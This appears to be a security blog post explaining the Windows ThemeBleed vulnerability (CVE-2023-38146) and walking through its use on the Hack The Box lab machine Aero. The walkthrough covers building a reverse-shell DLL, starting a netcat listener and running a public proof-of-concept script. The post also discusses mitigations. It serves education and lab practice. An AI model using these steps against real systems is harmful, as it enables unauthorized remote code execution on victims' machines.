+++
title = "Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability"
tags = ["Windows", "Active Directory", "CVE-2023-38146", "ThemeBleed"]
draft = false
author = "bloodstiller"
date = 2024-11-05
+++

## Understanding CVE-2023-38146: ThemeBleed Windows Vulnerability: {#understanding-cve-2023-38146-themebleed-windows-vulnerability}

ThemeBleed (CVE-2023-38146) represents a critical vulnerability in Windows Theme Feature that allows local privilege escalation through improper handling of theme binary data.


### What is ThemeBleed? {#what-is-themebleed}

ThemeBleed is a security vulnerability in the Windows Theme Binary Data feature where improper handling of theme files can lead to:

-   Local privilege escalation
-   Arbitrary file read
-   Potential system compromise


### Technical Deep Dive: {#technical-deep-dive}


#### Component Overview: {#component-overview}

The vulnerability exists in several key Windows components:

```text
Affected Components:
├── Theme Binary Data Parser
│   ├── Handles .THEME and .MSSTYLES files
│   └── Responsible for version validation
├── Windows Theme Service
│   ├── Loads theme resources
│   └── Manages DLL verification
└── Desktop Window Manager
    ├── Applies visual themes
    └── Executes theme components
```


#### Discovery Background: {#discovery-background}

Security researcher [Will Kirkpatrick](https://exploits.forsale/themebleed/) discovered this vulnerability while investigating uncommon Windows file formats, specifically focusing on the .THEME format used for Windows visual customization.


#### Vulnerability Details: {#vulnerability-details}

The vulnerability involves several key components:

```text
Theme Components:
├── .THEME files
│   └── Contains appearance settings
├── .MSSTYLES files
│   ├── Should only contain graphical resources
│   └── No executable code intended
└── Version handling
    ├── Special "999" version number
    └── Improper DLL validation
```


#### Race Condition Exploitation: {#race-condition-exploitation}

The core issue lies in the handling of `.MSSTYLES` files when a specific version number (999) is used:

1.  **Initial DLL Verification**:
    -   System checks "`_vrf.dll`" signature
    -   Validates file integrity

2.  **Race Window**:
    -   Time gap between verification and loading
    -   Allows DLL replacement
    -   Original verification becomes invalid

3.  **Exploitation**:
    -   Malicious DLL can be substituted
    -   System loads replaced DLL
    -   Arbitrary code execution achieved


#### Distribution Vector: {#distribution-vector}

The vulnerability has two interesting distribution aspects:

1.  **Direct Theme Files**:
    -   Downloads trigger mark-of-the-web warnings
    -   Users receive security prompts
    -   Some protection provided

2.  **THEMEPACK Bypass**:
    -   `.THEMEPACK` files are CAB archives
    -   Automatically extract and apply themes
    -   Bypass mark-of-the-web protection
    -   No security warnings shown


### Real-World Exploitation Example: {#real-world-exploitation-example}

-   This was performed on the hack the box machine Aero:
    -   <https://app.hackthebox.com/machines/Aero>


#### Available Proof of Concept: {#available-proof-of-concept}

A public POC for the `ThemeBleed` exploit is available at:

-   <https://github.com/Jnnshschl/CVE-2023-38146>
    -   The creator has also written a [blog-post](https://jnns.de/posts/cve-2023-38146-poc/) to accompany the POC.
-   +Note+: There are multiple POC's however this is just my preffered one.


#### Exploitation Process {#exploitation-process}

1.  **Payload Preparation**:
    -   Create malicious DLL containing reverse shell code
    -   Configure connection parameters (IP, port)
    -   Compile in Release mode for target architecture

2.  **Exploit Setup**:

<!--listend-->

```text
Directory Structure:
└── exploit_root/
    ├── tb/
    │   └── Aero.msstyles_vrf_evil.dll # Our compiled reverse shell DLL that gains SYSTEM
    │   └── Aero.msstyles              # Modified theme file that triggers the exploit
    │   └── Aero.msstyles_vrf.dll      # Legitimate Microsoft-signed DLL we race against
    └── themebleed.py                  # Python script that orchestrates the attack
```

1.  **Execution Flow**:
    -   Attacker starts listener on control server
    -   Exploit script triggers theme loading
    -   Race condition allows DLL substitution
    -   Reverse shell connects to attacker


#### Building the ThemeBleed CVE-2023-38146 Reverse Shell DLL: {#building-the-themebleed-cve-2023-38146-reverse-shell-dll}

The exploit requires a reverse shell DLL. A POC for this is available at:

-   <https://github.com/Jnnshschl/ThemeBleedReverseShellDLL>

<!--list-separator-->

-  Development Environment Setup

    -   Windows 10 VM (my preffered version is setup using [Mandiant Commando script](https://github.com/mandiant/commando-vm))
        -   [Visual Studio](https://visualstudio.microsoft.com/downloads/) +(not Visual Studio Code+)

<!--list-separator-->

-  Building Process

    1.  **Open Visual Studio and clone the repo**:
        -   {{< figure src="/ox-hugo/2024-11-04-174350_.png" >}}
        -   {{< figure src="/ox-hugo/2024-11-04-174430_.png" >}}

    2.  **Configure attack parameters**:
        -   Locate `main.cpp`
        -   Set attack IP and port (lines 32/34)
        -   Set "autoReconnect" to `false`
        -   {{< figure src="/ox-hugo/2024-11-04-180155_.png" >}}

    3.  **Prepare for compilation**:
        -   Set to release mode
        -   {{< figure src="/ox-hugo/2024-11-04-180354_.png" >}}

    <!--listend-->

    1.  **Build the solution**:
        ![](/ox-hugo/2024-11-04-180428_.png)
        +Note+: "Building the solution" means compiling the exploit

    <!--listend-->

    1.  **Locate the compiled DLL at**:
        -   `C:\Users\[YourUserName]\source\repos\ThemeBleedReverseShellDLL\x64\Release\ThemeBleeedReverseShell.dll`


#### Executing the Exploit {#executing-the-exploit}

1.  **Clone the main exploit repository**:
    `git clone https://github.com/Jnnshschl/CVE-2023-38146.git`

2.  **Prepare the payload**:

    -   Move `ThemeBleeedReverseShell.dll` to the `tb` folder
    -   Rename it to `Aero.msstyles_vrf_evil.dll`
    -   {{< figure src="/ox-hugo/2024-11-04-181130_.png" >}}

    +Note+: The repository mentions `td` folder but it's actually `tb`

3.  **Start the listener**:
    `rlwrap -cAr nc -nvlp 4711`

4.  **Execute the exploit**:
    `python3 themebleed.py -r [MYAttackMachine] --no-dll`

5.  **Receive the connection**:
    -   {{< figure src="/ox-hugo/2024-11-04-181233_.png" >}}


### Impact Analysis: {#impact-analysis}


#### Affected Systems: {#affected-systems}

| Windows Version | Architecture | Vulnerable |
|-----------------|--------------|------------|
| Windows 11      | x64          | Yes        |
| Windows 10      | x64          | Yes        |
| Server 2019     | x64          | Yes        |
| Server 2022     | x64          | Yes        |


#### Security Implications: {#security-implications}

**The vulnerability can lead to**:

1.  Local privilege escalation
2.  System compromise
3.  Unauthorized file access


### Mitigation: {#mitigation}


#### Mitigation Strategies {#mitigation-strategies}

1.  **System Updates**:
    -   Apply latest Windows security updates
    -   Enable automatic updates

2.  **Access Controls**:

<!--listend-->

```powershell
# PowerShell: Restrict theme directory access
$acl = Get-Acl "C:\Windows\Resources\Themes"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "Users","Read","Allow")
$acl.SetAccessRule($rule)
Set-Acl "C:\Windows\Resources\Themes" $acl
```

1.  **Group Policy Settings**:
    -   Disable theme changes for standard users
    -   Restrict access to theme directories


### Prevention Best Practices {#prevention-best-practices}

1.  **System Hardening**:
    -   Implement principle of least privilege
    -   Regular security updates
    -   Monitor theme-related activities

2.  **Security Controls**:
    -   Application control policies
    -   User access restrictions
    -   System monitoring
    -   Block `.THEMEPACK` files at network edge
    -   Monitor DLL loading during theme changes


### References {#references}

1.  [Microsoft Security Advisory](https://www.bleepingcomputer.com/news/microsoft/microsoft-september-2023-patch-tuesday-fixes-2-zero-days-59-flaws/)
2.  [CVE-2023-38146 Details](https://nvd.nist.gov/vuln/detail/CVE-2023-38146)
3.  [Bleeping Computer](https://www.bleepingcomputer.com/news/security/windows-11-themebleed-rce-bug-gets-proof-of-concept-exploit/)
4.  [Will Kirkpatrick's Technical Analysis](https://exploits.forsale/themebleed/)
